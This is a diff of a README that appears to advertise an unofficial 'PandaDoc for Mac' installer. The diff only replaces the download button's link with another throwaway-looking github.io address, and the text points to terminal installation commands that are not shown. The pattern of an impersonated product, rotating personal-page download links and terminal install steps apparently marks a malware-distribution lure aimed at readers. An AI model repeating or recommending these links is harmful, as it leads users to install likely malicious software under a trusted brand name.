@@ -3,7 +3,7 @@
 
 Easily install **PandaDoc for Mac** and start creating, editing, and managing digital documents with ease 📑✨. Follow the instructions below to download and install it safely on your macOS device.
 
-[![Download For Mac](https://img.shields.io/badge/Download%20For%20Mac-007AFF?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/pandadoc)
+[![Download For Mac](https://img.shields.io/badge/Download%20For%20Mac-007AFF?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/apppandadoc)
 
 If the button does not work, follow the installation guide below using terminal commands.
 
